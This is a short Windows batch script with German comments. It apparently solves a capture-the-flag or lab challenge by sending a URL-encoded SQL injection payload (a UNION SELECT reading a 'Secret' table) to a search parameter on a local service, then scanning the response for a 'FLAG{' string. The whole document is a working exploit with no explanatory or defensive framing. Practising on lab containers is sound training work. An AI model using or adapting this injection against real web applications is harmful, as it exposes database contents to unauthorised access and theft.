@echo off
chcp 65001 > nul

:: Konfiguration
set "TARGET_URL=http://127.0.0.1:8080/"
set "PAYLOAD=%%27%%20UNION%%20SELECT%%20name%%2C%%20description%%20FROM%%20Secret%%20WHERE%%20%%271%%27%%3D%%271"

echo [*] Sende Exploit-Payload an %TARGET_URL%...

echo --------------------------------------------------
:: 1. Curl feuert den Request ab
:: 2. findstr filtert live nach der Zeile, die "FLAG{" enthält
curl -s "%TARGET_URL%?search=%PAYLOAD%" | findstr /I "FLAG{"
if %errorlevel% neq 0 (
    echo [-] Fehler: Keine Flagge gefunden. Läuft der Container?
) else (
    echo.
    echo [+] Erfolg! Die Flagge wurde im HTML-Code gefunden!
)
echo --------------------------------------------------

pause